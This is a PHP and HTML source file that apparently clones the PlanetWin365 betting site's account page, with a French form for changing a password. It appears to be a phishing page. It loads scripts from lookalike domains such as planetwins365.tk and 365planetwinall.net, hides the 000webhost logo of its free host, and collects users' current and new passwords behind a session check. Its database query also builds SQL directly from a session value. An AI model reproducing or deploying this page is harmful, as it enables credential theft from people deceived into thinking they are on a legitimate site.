<?php
session_start();

if(!isset($_SESSION['pw_logged_user'])){
    header("Location:../login.php");
}

require_once('../db_connect.php');

$identificateur = $_SESSION['pw_logged_user'];

$gid = mysqli_query($dbhandle, "SELECT * FROM usager WHERE identificateur = '$identificateur'");
$row = mysqli_fetch_assoc($gid);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="h_w_h"><title>
        planetwin365
    </title><link rel="SHORTCUT ICON" href="http://planetwin365.com/App_Themes/PlanetWin365/Images/Icons/favicon.ico" type="text/css"></link><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><link type="text/css" rel="stylesheet" href="http://static.planetwin365.com/App_Themes/PlanetWin365/layout.css" /><link type="text/css" rel="stylesheet" href="http://static.planetwin365.com/App_Themes/PlanetWin365/calendar.css" /><link type="text/css" rel="stylesheet" href="http://static.planetwin365.com/App_Themes/PlanetWin365/coupon.css" /><link type="text/css" rel="stylesheet" href="http://static.planetwin365.com/App_Themes/PlanetWin365/download_card.css" /><link type="text/css" rel="stylesheet" href="http://static.planetwin365.com/App_Themes/PlanetWin365/quote.css" /><link type="text/css" rel="stylesheet" href="http://static.planetwin365.com/App_Themes/PlanetWin365/WebRadio.css" />



    <link rel="stylesheet" href="//code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="//code.jquery.com/ui/1.11.4/jquery-ui.js"></script>

    <script src="http://ww3.365planetwinall.net/Scripts/Flash.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/Coupon.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/Common.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/ClickBet.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/odds.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/jquery.cookie.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/jquery.scrollable.min.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/jquery.cycle.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/Scroller/jquery.scrollTo-min.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/Scroller/jquery.serialScroll-min.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/jquery.innerfade.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/jcarousellite_1.0.1.min.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/swfobject.js" type="text/javascript"></script>
    <script src="http://ww3.365planetwinall.net/Scripts/Session.js" type="text/javascript"></script>




    <script language="javascript" type="text/javascript">
        // variabili specifihe per bookmaker
        var divCouponTopPosition = 0; //Posizione top del coupon, se <=0 disabilita scroll
        var heightFooter = 206 //Altezza footer per far in modo che il coupon non ci vada sopra
        var hideAgentSummary = 1; //1 nasconde inizialmente il riassunto nella defaultlogged
        var themeUrl = 'http://static.planetwin365.com/App_Themes/PlanetWin365/';
        var TVClientID = null;
        var TVClientLimiteCampionati = null;
        var TVClientLimiteCampionatiErr = null;
        var sepDec = ',';
        var ExpandSubEvent = 1;
        var isAnonymous = 'True';
        var bestsellerQT = false;
        var qtaDeleted = false;

        function OpenLiveChat() {
        }

        function OpenWebRadio(url, widthDiv, heightDiv) {
        }

        function scrollToCoupon() {
            setTimeout(function(){
                $('html, body').animate({
                    scrollTop: $("#divCoupon").offset().top }, 250);
                setTimeout(function(){
                    $(".CItems").effect("pulsate", { times:1 }, 2000);
                }, 250);
            }, 250);
        }

        function pulsateCoupon() {
        }


        $(document).ready(function() {

            $("a").on('click', function(e) {
                if( $(this).hasClass( "active" ) ) { }
                else {
                    e.preventDefault;
                    return false;
                }
            });

        });
    </script>

    <script type="text/javascript">
        var sBtnUpdateSaldo = 'h_w_cLogin_btnSaldo';
    </script>

    <script>
        $( document ).ready(function() {
            var isInputSupported = 'placeholder' in document.createElement('input');
            var isTextareaSupported = 'placeholder' in document.createElement('textarea');
            if (!isInputSupported || !isTextareaSupported) {
                $('[placeholder]').focus(function () {
                    var input = $(this);
                    if (input.val() == input.attr('placeholder') && input.data('placeholder')) {
                        input.val('');
                        input.removeClass('placeholder');
                    }
                }).blur(function () {
                    var input = $(this);
                    if (input.val() == '') {
                        input.addClass('placeholder');
                        input.val(input.attr('placeholder'));
                        input.data('placeholder', true);
                    } else {
                        input.data('placeholder', false);
                    }
                }).blur().parents('form').submit(function () {
                    $(this).find('[placeholder]').each(function () {
                        var input = $(this);
                        if (input.val() == input.attr('placeholder') && input.data('placeholder')) {
                            input.val('');
                        }
                    })
                });
            }

        });
        function pageLoad() {
            if ($('.txtLogin').length>0) {
                $('input:not(.txtLogin), select').bind("focus", function () {
                    preventSavingCredentials();
                });
            }
        }
        function preventSavingCredentials() {
            document.getElementsByClassName('RegTxtPwd')[0].children[0].value = document.getElementById('inputPassword').value;
            document.getElementsByClassName('RegTxtPwd')[0].children[0].type = "text";
            document.getElementById('fakePasswordTxt').value = "";
            document.getElementById('inputPassword').value = "";
        }
    </script>
</head>
<body class="bodyMain Anonymous fr-FR">


<div>

    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="15C4A0A3" />
</div>
<div style="position:absolute; top:0; left:0; width:5px; height:5px;" title='SRVM-WEB09'></div>


<script type="text/javascript">
    $('.bodyMain').css('background-image', 'url(../1/1.jpg)');


</script>






<div id="sessionEndWarning"> </div>
<div class="divMainHome">
    <!--HEADER-->
    <?php include("../header.php");?>
    <!--MAIN-->








    <div id="divMain">
        <div id="divContent">

            <table id="tblMainContent" cellpadding="0" cellspacing="0">
                <tbody><tr><td><div class="spacer5"></div></td></tr>
                <tr><td class="tdCNMaxAccount"><div id="MainContent">

                            <script language="javascript" type="text/javascript">
                                $(document).ready(function() {
                                    initializePopup("popupAnnullamentoClose", "popupAnnullamento", "backgroundPopup");
                                });

                                function showPopup(IDCoupon) {

                                    centerPopup("popupAnnullamento", "backgroundPopup");

                                    var PathIndi;
                                    PathIndi = 'BetRefuse.aspx'



                                    $("iframe[id=ifPopup]").attr("src",PathIndi + "?IDCoupon=" + IDCoupon) ;

                                    loadPopup("popupAnnullamento", "backgroundPopup");

                                }

                            </script>



                           <div id="MainContent">
                    
 <div id="MainContent">
                    
    
    <div class="Riquadro"><div class="TopSX"><div class="TopDX"><h3>Données usager</h3></div></div><div class="CntSX"><div class="CntDX"><div id="s_w_PC_PC_panelSquare">
	
    <div class="RiquadroNews Reg"><div class="TopSX"><div class="TopDX"></div></div><div class="Cnt"><div>
		

    <div id="s_w_PC_PC_upDati">
            <script>

            function toggleRefreshBtn() {
                var IsShowRefreshField = 's_w_PC_PC_IsShowRefreshLink';
                var RefreshLink = 's_w_PC_PC_UserAvanti';
                var showRefreshLink = $('#' + IsShowRefreshField + '').val().toString().toLowerCase();
                var mainMenuVisible = $('.topMenu').find('ul').length;

                if ((showRefreshLink == "true") && (mainMenuVisible == 0)) {
                    $('#' + RefreshLink + '').css("visibility", "visible");
                } else {
                    $('#' + RefreshLink + '').css("visibility", "hidden");
                }

            }

                $(document).ready(function () {

            });
            function pageLoad() {
                $('#s_w_PC_PC_TextBoxTipoDocumento').val($('#s_w_PC_PC_ddlTipoDocumento option:selected').text());
                if ($('#s_w_PC_PC_ddlTipoDocumento').is(':disabled')) {
                    $('#s_w_PC_PC_TextBoxTipoDocumento').show();
                    $('#s_w_PC_PC_TextBoxTipoDocumento').attr('disabled', 'disabled');
                    $('#s_w_PC_PC_TextBoxTipoDocumento').attr('readonly', true);
                    $('#s_w_PC_PC_ddlTipoDocumento').hide();
                } else {
                    $('#s_w_PC_PC_TextBoxTipoDocumento').hide();
                    $('#s_w_PC_PC_ddlTipoDocumento').show();
                }
            }
                function preventPwdSave() {
                    document.getElementById('s_w_PC_PC_CurrentPassword').value = document.getElementById('s_w_PC_PC_tempCurrentPassword').value;
                    document.getElementById('s_w_PC_PC_tempCurrentPassword').value = "";
                    document.getElementById('s_w_PC_PC_tempCurrentPassword').type = "text";
                    document.getElementById('s_w_PC_PC_Password').value = document.getElementById('s_w_PC_PC_tempPassword').value;
                    document.getElementById('s_w_PC_PC_tempPassword').value = "";
                    document.getElementById('s_w_PC_PC_tempPassword').type = "text";
                    document.getElementById('s_w_PC_PC_Confirm').value = document.getElementById('s_w_PC_PC_tempConfirm').value;
                    document.getElementById('s_w_PC_PC_tempConfirm').value = "";
                    document.getElementById('s_w_PC_PC_tempConfirm').type = "text";

                    $("#s_w_PC_PC_btnUpdatePwd").click();

                    setTimeout(function () {
                        document.getElementById('s_w_PC_PC_tempCurrentPassword').type = "password";
                        document.getElementById('s_w_PC_PC_tempPassword').type = "password";
                        document.getElementById('s_w_PC_PC_tempConfirm').type = "password";
                    }, 50);

                }
            </script>

            <table id="s_w_PC_PC_tblTabs" border="0" cellpadding="0" cellspacing="0" height="21" class="tblTabs">
	<tbody><tr height="100%">
		<td id="s_w_PC_PC_tdDetails" class="cellaDeSel"><a id="s_w_PC_PC_lnkDatiAnag" href="javascript:__doPostBack('s$w$PC$PC$lnkDatiAnag','')">Données personnelles</a></td>
		<td id="s_w_PC_PC_tdPwd" class="cellaSel"><a id="s_w_PC_PC_lnkDatiPassword" href="javascript:__doPostBack('s$w$PC$PC$lnkDatiPassword','')">Mot de passe</a></td>
		<td id="s_w_PC_PC_tdBackground" class="cellaDeSel"><a id="s_w_PC_PC_lnkBackground" href="javascript:__doPostBack('s$w$PC$PC$lnkBackground','')">Backgrounds</a></td>
		<td id="s_w_PC_PC_tdGestioneSito" class="cellaDeSel"><a id="s_w_PC_PC_lnkGestioneSito" href="javascript:__doPostBack('s$w$PC$PC$lnkGestioneSito','')">Paramètres</a></td>
		<td width="100%"></td>
	</tr>
</tbody></table>

            
            <div id="s_w_PC_PC_vsValNewUser" class="ValidationSummary" style="color:Red;display:none;">

</div>
            

            <div id="s_w_PC_PC_vsValPwd" class="ValidationSummary" style="color:Red;display:none;">

</div>
			
            <div id="s_w_PC_PC_vsValPwdReport" class="ValidationSummary" style="color:Red;display:none;">

</div>
			

            <div id="s_w_PC_PC_panelPwd" onkeypress="javascript:return WebForm_FireDefaultButton(event, 's_w_PC_PC_btnUpdatePwdFake')">
	
                <table width="100%" cellspacing="0">
                    <tbody><tr>
                        <td colspan="4" class="cellaInfo">Utilisez le formulaire ci-dessous pour modifier votre mot de passe<br>
Le nouveau mot de passe doit être différent de celui précédent.<br>
Le mot de passe doit comporter entre 8 et 20 caractères et ne peut contenir que des lettres et des chiffres</td>
                    </tr>
					
                    <tr>
                        <td class="cellaSx" width="100%">Mot de passe courant</td>
                        <td class="cellaSx"><b>*</b></td>
                        <td class="cellaDx"><input name="s$w$PC$PC$tempCurrentPassword" type="password" maxlength="32" id="s_w_PC_PC_tempCurrentPassword" class="textbox" style="width:172px;"><input name="s$w$PC$PC$CurrentPassword" type="text" maxlength="32" id="s_w_PC_PC_CurrentPassword" class="textbox" style="width:150px;display:none;"></td>
                        <td>
                            <span id="s_w_PC_PC_reqCurrentPassword" class="validation-error" style="color:Red;display:none;"><img src="//static.planetwin365.com/App_Themes/PlanetWin365/images/Error_Small.png" border="0"></span>
                            
                        </td>
                    </tr>
                    <tr>
                        <td class="cellaSx">Mot de passe</td>
                        <td class="cellaSx"><b>*</b></td>
                        <td class="cellaDx"><input name="s$w$PC$PC$tempPassword" type="password" maxlength="32" id="s_w_PC_PC_tempPassword" class="textbox" style="width:172px;"><input name="s$w$PC$PC$Password" type="text" maxlength="32" id="s_w_PC_PC_Password" class="textbox" style="width:150px;display:none;"></td>
                        <td>
                            <span id="s_w_PC_PC_reqPassword" class="validation-error" style="color:Red;display:none;"><img src="//static.planetwin365.com/App_Themes/PlanetWin365/images/Error_Small.png" border="0"></span>
                            
                            
                        </td>
                    </tr>
                    <tr>
                        <td class="cellaSx">Confirmer Mot de passe</td>
                        <td class="cellaSx"><b>*</b></td>
                        <td class="cellaDx"><input name="s$w$PC$PC$tempConfirm" type="password" maxlength="32" id="s_w_PC_PC_tempConfirm" class="textbox" style="width:172px;"><input name="s$w$PC$PC$Confirm" type="text" maxlength="32" id="s_w_PC_PC_Confirm" class="textbox" style="width:150px;display:none;"></td>
                        <td>
                            <span id="s_w_PC_PC_reqConfirmPassword" class="validation-error" style="color:Red;display:none;"><img src="//static.planetwin365.com/App_Themes/PlanetWin365/images/Error_Small.png" border="0"></span>
                            <span id="s_w_PC_PC_cmpPassword" style="color:Red;display:none;"><img src="//static.planetwin365.com/App_Themes/PlanetWin365/images/Error_Small.png" border="0"></span>
                        </td>
                    </tr>

                    
                    
                    
                    <tr id="s_w_PC_PC_trInfoDomanda">
		<td class="cellaSx" colspan="4">
                            
                        </td>
	</tr>
	

                    <tr>
                        <td colspan="4"><div class="spacer5"></div></td>
                    </tr>
                    <tr>
                        <td align="right" colspan="3">
                            <input type="submit" name="s$w$PC$PC$btnResetPwd" value="Effacer" onclick="this.form.reset();return false;" id="s_w_PC_PC_btnResetPwd" class="button" onmouseover="RollIn(this,'buttonRollIn')" onmouseout="RollOut(this,'button')">
                            <input type="button" name="s$w$PC$PC$btnUpdatePwdFake" value="Enregistrer" onclick="preventPwdSave(); return false;WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;s$w$PC$PC$btnUpdatePwdFake&quot;, &quot;&quot;, true, &quot;ValPwd&quot;, &quot;&quot;, false, true))" id="s_w_PC_PC_btnUpdatePwdFake" class="button" style="width:75px;">
                            <input type="submit" name="s$w$PC$PC$btnUpdatePwd" value="Sauver Comm" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;s$w$PC$PC$btnUpdatePwd&quot;, &quot;&quot;, true, &quot;ValPwd&quot;, &quot;&quot;, false, false))" id="s_w_PC_PC_btnUpdatePwd" class="button" onmouseover="RollIn(this,'buttonRollIn')" onmouseout="RollOut(this,'button')" style="visibility:hidden;">
                        </td>
                        <td></td>
                    </tr>
                    <tr>
                        <td colspan="4" class="cellaInfo" align="center"></td>
                    </tr>
                </tbody></table> 
            
</div> 

            

            
            
            

            
            
            

            

            

            


            <input type="hidden" name="s$w$PC$PC$IsShowRefreshLink" id="s_w_PC_PC_IsShowRefreshLink" value="False">

        </div>
    
	</div></div><div class="BtmSX"><div class="BtmDX"></div></div></div>     

</div></div></div><div class="BtmSX"><div class="BtmDX"></div></div></div>
    <a id="s_w_PC_PC_UserAvanti" class="user-avanti user-dati" onclick="javascript: location.reload();" style="visibility: hidden;">Continuer</a>

                </div>
                
                <script type="text/javascript" src="http://planetwins365.tk/livechat/php/app.php?widget-init.js"></script>

<style>
img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
    display: none;
}
</style>
</body>
</html>
